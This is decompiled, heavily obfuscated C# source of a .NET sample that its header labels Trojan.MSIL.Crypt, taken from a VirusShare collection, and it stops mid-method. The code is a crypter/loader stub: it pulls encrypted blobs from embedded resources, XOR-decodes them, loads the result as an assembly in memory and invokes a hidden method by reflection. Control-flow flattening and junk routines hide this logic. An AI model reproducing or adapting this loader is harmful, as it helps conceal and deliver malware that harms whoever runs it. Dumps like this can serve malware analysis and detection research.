// Decompiled with JetBrains decompiler
// Type: Ⴗ.Ⴐ
// Assembly: index1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0CDDFC5-8A53-4CCF-BF4E-C8BB50C9BEC3
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.gsr-6aecc634a06400e6a917a845023526916fd6cc619d9bbc406bd268c4b3a0a713.exe

using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

namespace Ⴗ
{
  internal sealed class Ⴐ
  {
    private static readonly char[] ႥႰ;
    private static readonly string[] ႥႠ;

    private static void Ⴈ()
    {
      Ⴗ.Ⴗ.ႥႭ();
      try
      {
        int num = 0;
        ResourceManager resourceManager;
        string str;
        string s;
        byte[] Ⴈ;
        while (true)
        {
          switch (num)
          {
            case 1:
            case 4:
              s = (string) Ⴗ.Ⴗ.ႨႳ(resourceManager, Ⴗ.Ⴐ.ႥႥ(1752227530), 699, 646);
              Ⴗ.Ⴗ.ႨႷ(resourceManager, 571, 517);
              Ⴈ = Ⴗ.Ⴐ.Ⴍ(Ⴗ.Ⴗ.ႭႤ(Ⴗ.Ⴗ.ႨႼ(241, 247), str, 353, 278), Ⴗ.Ⴐ.ႥႥ(1752227531));
              num = 2;
              continue;
            case 2:
              goto label_6;
            case 3:
              str = (string) Ⴗ.Ⴗ.ႨႳ(resourceManager, Ⴗ.Ⴐ.ႥႥ(1752227529), 415, 418);
              num = 4;
              continue;
            default:
              resourceManager = new ResourceManager(Ⴗ.Ⴐ.ႥႥ(1752227528), Ⴗ.Ⴐ.ႥႣ(767, 755));
              goto case 3;
          }
        }
label_6:
        Ⴗ.Ⴐ.Ⴈ(Ⴗ.Ⴐ.Ⴍ(Encoding.Default.GetBytes(s), Ⴗ.Ⴐ.ႥႥ(1752227531)), Ⴈ);
      }
      catch
      {
      }
      switch (4)
      {
        case 1:
          break;
        case 2:
          break;
        default:
          Ⴗ.Ⴐ.ႭႤ();
          break;
      }
    }

    public static void Ⴈ(byte[] Ⴄ, byte[] Ⴈ)
    {
      int num = 9;
      Type[] typeArray;
      int index1;
      Type type;
      MethodInfo[] methodInfoArray;
      int index2;
      MethodInfo methodInfo;
      object[] parameters;
      while (true)
      {
        switch (num)
        {
          case 0:
            parameters = new object[3]
            {
              (object) false,
              (object) Ⴗ.Ⴗ.ႭႥ(Ⴗ.Ⴐ.ႥႣ(172, 160), 660, 657),
              null
            };
            num = 12;
            continue;
          case 1:
          case 5:
            num = index1 < typeArray.Length ? 13 : 2;
            continue;
          case 2:
            goto label_12;
          case 3:
          case 11:
            methodInfoArray = Ⴗ.Ⴐ.ႥႼ(type, 747, 665);
            index2 = 0;
            num = 6;
            continue;
          case 6:
            num = index2 < methodInfoArray.Length ? 10 : 8;
            continue;
          case 7:
            ++index2;
            num = 6;
            continue;
          case 8:
            ++index1;
            num = 1;
            continue;
          case 10:
            methodInfo = methodInfoArray[index2];
            num = !Ⴗ.Ⴐ.ႥႷ(Ⴗ.Ⴐ.ႥႳ((object) methodInfo, 63, 51), Ⴗ.Ⴐ.ႥႥ(1752227533), 439, 419) ? 7 : 0;
            continue;
          case 12:
            parameters[2] = (object) Ⴈ;
            methodInfo.Invoke((object) null, parameters);
            num = 7;
            continue;
          case 13:
            type = typeArray[index1];
            num = !Ⴗ.Ⴐ.ႥႷ(Ⴗ.Ⴐ.ႥႳ((object) type, 202, 198), Ⴗ.Ⴐ.ႥႥ(1752227532), 83, 71) ? 8 : 3;
            continue;
          default:
            typeArray = Ⴗ.Ⴗ.ႭႭ(Ⴗ.Ⴗ.ႭႨ(Ⴄ, 796, 819), 370, 365);
            index1 = 0;
            num = 1;
            continue;
        }
      }
label_12:
      Ⴗ.Ⴐ.ႭႥ();
    }

    public static byte[] Ⴍ(byte[] Ⴄ, string Ⴈ)
    {
label_3:
      int num1 = 350;
label_4:
      byte[] numArray1 = Ⴗ.Ⴗ.ႭႤ(Ⴗ.Ⴗ.ႨႼ(454, 449), Ⴈ, 947, 964);
label_5:
      int index = 0;
      int num2 = 7;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            ++index;
            num2 = 7;
            continue;
          case 2:
            goto label_4;
          case 3:
            Ⴄ[index] ^= (byte) ((int) numArray1[index % numArray1.Length] >> index + num1 + numArray1.Length & (int) byte.MaxValue);
            num2 = 1;
            continue;
          case 4:
            goto label_5;
          case 6:
            goto label_9;
          case 7:
            num2 = index < Ⴄ.Length ? 3 : 6;
            continue;
          case 8:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.Ⴍ);
            num2 = 8;
            continue;
        }
      }
label_9:
      byte[] numArray2 = Ⴄ;
      Ⴗ.Ⴐ.ႨႠ();
      return numArray2;
    }

    public Ⴐ()
    {
      int num = (int) Ⴗ.Ⴐ.ႨႥ();
    }

    static Ⴐ()
    {
      Ⴗ.Ⴗ.ႥႭ();
      Ⴗ.Ⴐ.ႥႰ = new char[8]
      {
        '㱵',
        'ᒷ',
        'ཡ',
        '᥀',
        '㜼',
        '⨮',
        '㽾',
        'É'
      };
      Ⴗ.Ⴐ.ႥႠ = new string[7];
    }

    internal static int Ⴄ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(1002, 940), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 676, 746);
      Ⴗ.Ⴗ.ႨႠ();
      return 8;
    }

    internal static int Ⴅ()
    {
label_3:
      int num1 = 408;
      int num2 = 162;
label_4:
      int num3 = 204 < num1 / 2 - num2 ? 4 : 1;
      while (true)
      {
        switch (num3)
        {
          case 1:
          case 6:
            Ⴗ.Ⴐ.Ⴅ();
            num3 = 4;
            continue;
          case 2:
          case 4:
            goto label_6;
          case 3:
            goto label_3;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.Ⴅ);
            num3 = 3;
            continue;
        }
      }
label_6:
      Ⴗ.Ⴐ.ႨႼ();
      return 3;
    }

    internal static void Ⴐ()
    {
      int num1 = 2;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
            int num3 = 468;
            num1 = 541 < num2 / 4 - num3 ? 3 : 0;
            continue;
          case 3:
          case 5:
            goto label_5;
          case 4:
            goto label_6;
          default:
            num2 = 2164;
            goto case 1;
        }
      }
label_6:
      return;
label_4:
      Ⴗ.Ⴐ.Ⴐ();
label_5:
      Ⴗ.Ⴐ.ႨႣ();
    }

    internal static void Ⴀ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(170, 226), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 826, 874);
      Ⴗ.Ⴗ.ႨႤ();
    }

    internal static byte Ⴃ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(164, 234), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 992, 948);
      Ⴗ.Ⴗ.ႨႥ();
      return 4;
    }

    internal static void Ⴓ()
    {
      int num1 = 1;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 4:
            goto label_5;
          case 3:
            goto label_4;
          case 5:
            int num3 = num2 * num2;
            num1 = (num2 + num3) % 2 != 0 ? 0 : 3;
            continue;
          default:
            num2 = 70;
            goto case 5;
        }
      }
label_4:
      Ⴗ.Ⴐ.Ⴓ();
label_5:
      Ⴗ.Ⴐ.ႭႠ();
    }

    internal static string Ⴗ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(778, 858), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 961, 916);
      Ⴗ.Ⴐ.ႥႭ();
      return (string) null;
    }

    internal static string Ⴜ()
    {
label_3:
      int num1 = 264;
      int num2 = num1 * num1;
      int num3 = num1 + num2;
label_4:
      int num4 = num3 % 2 != 0 ? 3 : 4;
      while (true)
      {
        switch (num4)
        {
          case 0:
            goto label_4;
          case 2:
          case 3:
            goto label_6;
          case 4:
            Ⴗ.Ⴐ.Ⴜ();
            num4 = 3;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.Ⴜ);
            num4 = 5;
            continue;
        }
      }
label_6:
      Ⴗ.Ⴐ.ႨႨ();
      return (string) null;
    }

    internal static byte ႨႤ()
    {
label_3:
      int num1 = 41;
label_4:
      int num2 = 252 > 42 - num1 * 6 ? 4 : 3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
          case 6:
            goto label_7;
          case 2:
            goto label_4;
          case 3:
            num2 = 6;
            continue;
          case 4:
            int num3 = (int) Ⴗ.Ⴐ.ႨႤ();
            num2 = 6;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႤ);
            num2 = 7;
            continue;
        }
      }
label_7:
      Ⴗ.Ⴐ.ႥႨ();
      return 9;
    }

    internal static long ႨႨ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(149, 199), Ⴗ.Ⴗ.ႥႠ(1752227528), 1001, 1012);
label_4:
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 8 == numArray[index] ? 6 : 3;
            continue;
          case 1:
          case 2:
            goto label_3;
          case 3:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 6;
            continue;
          case 4:
            goto label_5;
          case 5:
          case 9:
            num1 = numArray[index] < (byte) 8 ? 4 : 0;
            continue;
          case 6:
            goto label_9;
          case 7:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႨ);
            num1 = 2;
            continue;
        }
      }
label_5:
      int num2 = (int) Ⴗ.Ⴐ.ႨႥ();
      return 4;
label_9:
      int num3 = index + 1;
      return 13;
    }

    internal static long ႨႭ()
    {
label_3:
      int index = 0;
label_4:
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(106, 50), Ⴗ.Ⴗ.ႥႠ(1752227528), 865, 894);
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 206 == numArray[index] ? 3 : 11;
            continue;
          case 1:
            goto label_4;
          case 2:
          case 4:
            num1 = numArray[index] < (byte) 8 ? 8 : 10;
            continue;
          case 3:
            goto label_14;
          case 5:
            ++index;
            num1 = 12;
            continue;
          case 7:
            goto label_10;
          case 8:
            goto label_5;
          case 9:
            goto label_3;
          case 10:
          case 14:
            num1 = (byte) 8 == numArray[index] ? 5 : 13;
            continue;
          case 11:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 3;
            continue;
          case 12:
            num1 = numArray[index] < (byte) 206 ? 7 : 0;
            continue;
          case 13:
            Ⴗ.Ⴗ.Ⴃ();
            num1 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႭ);
            num1 = 9;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴗ.ႨႤ();
      return 11;
label_10:
      return 2;
label_14:
      int num2 = index + 1;
      return 5;
    }

    internal static byte ႨႥ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(505, 419), Ⴗ.Ⴗ.ႥႠ(1752227528), 899, 930);
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
            num1 = (byte) 8 == numArray[index] ? 23 : 19;
            continue;
          case 3:
            num1 = (byte) 206 == numArray[index] ? 18 : 21;
            continue;
          case 4:
            goto label_23;
          case 5:
            num1 = numArray[index] < (byte) 8 ? 0 : 1;
            continue;
          case 7:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 17;
            continue;
          case 8:
            num1 = 13;
            continue;
          case 9:
            num1 = (byte) 224 == numArray[index] ? 17 : 7;
            continue;
          case 10:
            goto label_9;
          case 11:
            goto label_20;
          case 12:
            num1 = (byte) 13 == numArray[index] ? 14 : 4;
            continue;
          case 13:
            num1 = numArray[index] < (byte) 224 ? 24 : 9;
            continue;
          case 14:
            goto label_24;
          case 15:
            num1 = numArray[index] < (byte) 206 ? 10 : 3;
            continue;
          case 16:
            num1 = numArray[index] < (byte) 13 ? 11 : 12;
            continue;
          case 17:
            ++index;
            num1 = 16;
            continue;
          case 18:
            ++index;
            goto case 8;
          case 19:
            Ⴗ.Ⴐ.Ⴀ();
            goto case 20;
          case 20:
          case 23:
            ++index;
            num1 = 15;
            continue;
          case 21:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 18;
            continue;
          case 22:
            goto label_3;
          case 24:
            goto label_15;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႥ);
            num1 = 22;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႨႠ();
      return 12;
label_9:
      return 15;
label_15:
      return 1;
label_20:
      return 4;
label_23:
      Ⴗ.Ⴐ.Ⴐ();
label_24:
      int num2 = index + 1;
      return 3;
    }

    internal static object ႨႰ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(629, 558), Ⴗ.Ⴗ.ႥႠ(1752227528), 866, 832);
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = numArray[index] < (byte) 8 ? 6 : 22;
            continue;
          case 2:
            num1 = numArray[index] < (byte) 79 ? 18 : 10;
            continue;
          case 3:
            goto label_14;
          case 4:
            goto label_24;
          case 5:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 32;
            continue;
          case 6:
            goto label_4;
          case 7:
            num1 = numArray[index] < (byte) 13 ? 29 : 28;
            continue;
          case 8:
            ++index;
            num1 = 7;
            continue;
          case 9:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 25;
            continue;
          case 10:
            num1 = (byte) 79 == numArray[index] ? 21 : 23;
            continue;
          case 11:
            goto label_9;
          case 12:
            goto label_3;
          case 13:
            num1 = (byte) 224 == numArray[index] ? 8 : 16;
            continue;
          case 14:
          case 30:
            num1 = numArray[index] < (byte) 224 ? 3 : 13;
            continue;
          case 15:
            num1 = numArray[index] < (byte) 186 ? 4 : 31;
            continue;
          case 16:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 8;
            continue;
          case 17:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 27;
            continue;
          case 18:
            goto label_29;
          case 19:
            num1 = (byte) 206 == numArray[index] ? 32 : 5;
            continue;
          case 20:
          case 29:
            goto label_19;
          case 21:
            goto label_33;
          case 22:
          case 24:
            num1 = (byte) 8 == numArray[index] ? 27 : 17;
            continue;
          case 23:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 21;
            continue;
          case 25:
            ++index;
            num1 = 2;
            continue;
          case 26:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 33;
            continue;
          case 27:
            ++index;
            num1 = 34;
            continue;
          case 28:
            num1 = (byte) 13 == numArray[index] ? 33 : 26;
            continue;
          case 31:
            num1 = (byte) 186 == numArray[index] ? 25 : 9;
            continue;
          case 32:
            ++index;
            num1 = 30;
            continue;
          case 33:
            ++index;
            num1 = 15;
            continue;
          case 34:
            num1 = numArray[index] < (byte) 206 ? 11 : 19;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႰ);
            num1 = 12;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႥႨ();
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_29:
      return (object) null;
label_33:
      int num2 = index + 1;
      return (object) null;
    }

    internal static string ႨႠ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(460, 400), Ⴗ.Ⴗ.ႥႠ(1752227528), 609, 578);
      int num1 = 18;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 13 == numArray[index] ? 29 : 19;
            continue;
          case 1:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 7;
            continue;
          case 2:
          case 14:
            goto label_38;
          case 3:
            num1 = (byte) 103 == numArray[index] ? 14 : 10;
            continue;
          case 4:
            num1 = (byte) 8 == numArray[index] ? 13 : 20;
            continue;
          case 5:
            ++index;
            num1 = 34;
            continue;
          case 6:
            goto label_24;
          case 7:
            ++index;
            num1 = 37;
            continue;
          case 8:
            num1 = (byte) 79 == numArray[index] ? 23 : 27;
            continue;
          case 9:
            num1 = (byte) 206 == numArray[index] ? 26 : 33;
            continue;
          case 10:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 14;
            continue;
          case 11:
            num1 = numArray[index] < (byte) 103 ? 12 : 3;
            continue;
          case 12:
            goto label_34;
          case 13:
            ++index;
            num1 = 35;
            continue;
          case 15:
          case 22:
            goto label_4;
          case 16:
            num1 = (byte) 186 == numArray[index] ? 5 : 32;
            continue;
          case 17:
            goto label_9;
          case 18:
            num1 = numArray[index] < (byte) 8 ? 15 : 4;
            continue;
          case 19:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 21;
          case 20:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 13;
            continue;
          case 21:
          case 29:
            ++index;
            num1 = 30;
            continue;
          case 23:
            ++index;
            num1 = 11;
            continue;
          case 24:
            num1 = numArray[index] < (byte) 224 ? 39 : 38;
            continue;
          case 25:
            goto label_29;
          case 26:
            ++index;
            num1 = 24;
            continue;
          case 27:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 23;
            continue;
          case 30:
            num1 = numArray[index] < (byte) 186 ? 6 : 16;
            continue;
          case 31:
            goto label_19;
          case 32:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 5;
          case 33:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 26;
            continue;
          case 34:
            num1 = numArray[index] < (byte) 79 ? 25 : 8;
            continue;
          case 35:
            num1 = numArray[index] < (byte) 206 ? 17 : 9;
            continue;
          case 36:
            goto label_3;
          case 37:
            num1 = numArray[index] < (byte) 13 ? 31 : 0;
            continue;
          case 38:
            num1 = (byte) 224 == numArray[index] ? 7 : 1;
            continue;
          case 39:
            goto label_14;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႠ);
            num1 = 36;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႭႣ();
      return (string) null;
label_9:
      return (string) null;
label_14:
      return (string) null;
label_19:
      return (string) null;
label_24:
      return (string) null;
label_29:
      return (string) null;
label_34:
      return (string) null;
label_38:
      int num2 = index + 1;
      return (string) null;
    }

    internal static long ႨႣ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(381, 288), Ⴗ.Ⴗ.ႥႠ(1752227528), 709, 737);
      int num1 = 40;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_19;
          case 1:
            num1 = (byte) 103 == numArray[index] ? 13 : 11;
            continue;
          case 2:
            num1 = numArray[index] < (byte) 79 ? 31 : 20;
            continue;
          case 3:
            ++index;
            num1 = 4;
            continue;
          case 4:
            num1 = numArray[index] < (byte) 206 ? 35 : 24;
            continue;
          case 5:
            num1 = numArray[index] < (byte) 186 ? 30 : 44;
            continue;
          case 6:
            goto label_34;
          case 7:
            goto label_4;
          case 8:
            num1 = (byte) 8 == numArray[index] ? 3 : 28;
            continue;
          case 9:
            ++index;
            num1 = 2;
            continue;
          case 10:
          case 34:
            num1 = numArray[index] < (byte) 13 ? 0 : 17;
            continue;
          case 11:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 13;
            continue;
          case 12:
            goto label_39;
          case 13:
            ++index;
            num1 = 29;
            continue;
          case 14:
            ++index;
            num1 = 10;
            continue;
          case 15:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 14;
            continue;
          case 16:
            Ⴗ.Ⴗ.Ⴀ();
            num1 = 9;
            continue;
          case 17:
            num1 = (byte) 13 == numArray[index] ? 21 : 25;
            continue;
          case 18:
          case 21:
            ++index;
            num1 = 5;
            continue;
          case 19:
            goto label_14;
          case 20:
            num1 = (byte) 79 == numArray[index] ? 39 : 42;
            continue;
          case 22:
            num1 = (byte) 66 == numArray[index] ? 32 : 26;
            continue;
          case 23:
            num1 = numArray[index] < (byte) 224 ? 19 : 41;
            continue;
          case 24:
            num1 = (byte) 206 == numArray[index] ? 37 : 33;
            continue;
          case 25:
            Ⴗ.Ⴐ.Ⴓ();
            goto case 18;
          case 26:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 32;
            continue;
          case 28:
            Ⴗ.Ⴐ.Ⴜ();
            num1 = 3;
            continue;
          case 29:
            num1 = numArray[index] < (byte) 66 ? 12 : 22;
            continue;
          case 30:
            goto label_24;
          case 31:
            goto label_29;
          case 32:
            goto label_43;
          case 33:
            Ⴗ.Ⴐ.Ⴓ();
            goto case 37;
          case 35:
            goto label_9;
          case 37:
            ++index;
            num1 = 23;
            continue;
          case 38:
            goto label_3;
          case 39:
            ++index;
            num1 = 43;
            continue;
          case 40:
            num1 = numArray[index] < (byte) 8 ? 7 : 8;
            continue;
          case 41:
            num1 = (byte) 224 == numArray[index] ? 14 : 15;
            continue;
          case 42:
            Ⴗ.Ⴐ.Ⴜ();
            num1 = 39;
            continue;
          case 43:
            num1 = numArray[index] < (byte) 103 ? 6 : 1;
            continue;
          case 44:
            num1 = (byte) 186 == numArray[index] ? 9 : 16;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႣ);
            num1 = 38;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႨႨ();
      return 0;
label_9:
      return 5;
label_14:
      return 2;
label_19:
      return 14;
label_24:
      return 9;
label_29:
      return 0;
label_34:
      return 1;
label_39:
      return 6;
label_43:
      int num2 = index + 1;
      return 13;
    }

    internal static string ႨႳ()
    {
label_3:
      int index = 0;
label_4:
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(544, 638), Ⴗ.Ⴗ.ႥႠ(1752227528), 574, 539);
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_9;
          case 1:
            goto label_3;
          case 2:
          case 9:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 5;
            continue;
          case 3:
            num1 = numArray[index] < (byte) 8 ? 6 : 8;
            continue;
          case 6:
            goto label_5;
          case 7:
            goto label_4;
          case 8:
            num1 = (byte) 8 == numArray[index] ? 5 : 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႳ);
            num1 = 1;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႥႨ();
      return (string) null;
label_9:
      int num3 = index + 1;
      return (string) null;
    }

    internal static object ႨႷ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(906, 981), Ⴗ.Ⴗ.ႥႠ(1752227528), 477, 507);
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
            goto label_10;
          case 2:
          case 7:
            goto label_14;
          case 3:
            num1 = numArray[index] < (byte) 8 ? 0 : 11;
            continue;
          case 4:
          case 6:
            num1 = 14;
            continue;
          case 5:
            num1 = (byte) 206 == numArray[index] ? 7 : 8;
            continue;
          case 8:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 7;
            continue;
          case 9:
            Ⴗ.Ⴐ.Ⴀ();
            goto case 12;
          case 10:
            goto label_3;
          case 11:
            num1 = (byte) 8 == numArray[index] ? 12 : 9;
            continue;
          case 12:
            ++index;
            goto case 4;
          case 14:
            num1 = numArray[index] < (byte) 206 ? 1 : 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႷ);
            num1 = 10;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴗ.Ⴗ();
      return (object) null;
label_10:
      return (object) null;
label_14:
      int num2 = index + 1;
      return (object) null;
    }

    internal static object ႨႼ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(815, 847), Ⴗ.Ⴗ.ႥႠ(1752227528), 578, 613);
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++index;
            num1 = 8;
            continue;
          case 1:
            num1 = numArray[index] < (byte) 8 ? 11 : 16;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (byte) 206 == numArray[index] ? 0 : 9;
            continue;
          case 4:
          case 11:
          case 14:
            goto label_4;
          case 5:
            goto label_14;
          case 6:
            num1 = (byte) 224 == numArray[index] ? 18 : 15;
            continue;
          case 7:
            num1 = numArray[index] < (byte) 206 ? 10 : 3;
            continue;
          case 8:
            num1 = numArray[index] < (byte) 224 ? 5 : 6;
            continue;
          case 9:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 0;
          case 10:
            goto label_9;
          case 15:
            Ⴗ.Ⴗ.Ⴃ();
            num1 = 18;
            continue;
          case 16:
            num1 = (byte) 8 == numArray[index] ? 19 : 17;
            continue;
          case 17:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 19;
            continue;
          case 18:
            goto label_18;
          case 19:
            ++index;
            num1 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႨႼ);
            num1 = 2;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႭႼ();
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_18:
      int num2 = index + 1;
      return (object) null;
    }

    internal static long ႭႤ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(584, 553), Ⴗ.Ⴗ.ႥႠ(1752227528), 346, 370);
      int num1 = 26;
      while (true)
      {
        switch (num1)
        {
          case 1:
            ++index;
            num1 = 23;
            continue;
          case 2:
            num1 = numArray[index] < (byte) 186 ? 10 : 24;
            continue;
          case 3:
            ++index;
            num1 = 25;
            continue;
          case 4:
            num1 = (byte) 224 == numArray[index] ? 3 : 12;
            continue;
          case 5:
            Ⴗ.Ⴐ.Ⴜ();
            num1 = 31;
            continue;
          case 6:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 21;
            continue;
          case 7:
            num1 = numArray[index] < (byte) 206 ? 20 : 33;
            continue;
          case 8:
            ++index;
            num1 = 2;
            continue;
          case 9:
            num1 = (byte) 8 == numArray[index] ? 17 : 11;
            continue;
          case 10:
            goto label_24;
          case 11:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 17;
            continue;
          case 12:
            int num3 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 3;
            continue;
          case 13:
            int num4 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 1;
            continue;
          case 14:
          case 32:
            goto label_4;
          case 15:
          case 20:
            goto label_9;
          case 16:
            goto label_14;
          case 17:
            ++index;
            num1 = 7;
            continue;
          case 18:
            num1 = numArray[index] < (byte) 224 ? 16 : 4;
            continue;
          case 19:
            num1 = (byte) 13 == numArray[index] ? 8 : 28;
            continue;
          case 21:
            goto label_33;
          case 22:
            num1 = (byte) 79 == numArray[index] ? 21 : 6;
            continue;
          case 23:
            num1 = numArray[index] < (byte) 79 ? 30 : 22;
            continue;
          case 24:
            num1 = (byte) 186 == numArray[index] ? 1 : 13;
            continue;
          case 25:
            num1 = numArray[index] < (byte) 13 ? 34 : 19;
            continue;
          case 26:
            num1 = numArray[index] < (byte) 8 ? 32 : 9;
            continue;
          case 27:
            goto label_3;
          case 28:
          case 29:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 8;
            continue;
          case 30:
            goto label_29;
          case 31:
            ++index;
            num1 = 18;
            continue;
          case 33:
            num1 = (byte) 206 == numArray[index] ? 31 : 5;
            continue;
          case 34:
            goto label_19;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴐ.ႭႤ);
            num1 = 27;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႭႼ();
      return 8;
label_9:
      return 9;
label_14:
      return 14;
label_19:
      return 1;
label_24:
      return 9;
label_29:
      return 2;
label_33:
      int num5 = index + 1;
      return 11;
    }

    internal static long ႭႨ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(786, 880), Ⴗ.Ⴗ.ႥႠ(1752227528), 728, 753);
      int num1 = 17;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++index;
            num1 = 20;
            continue;
          case 1:
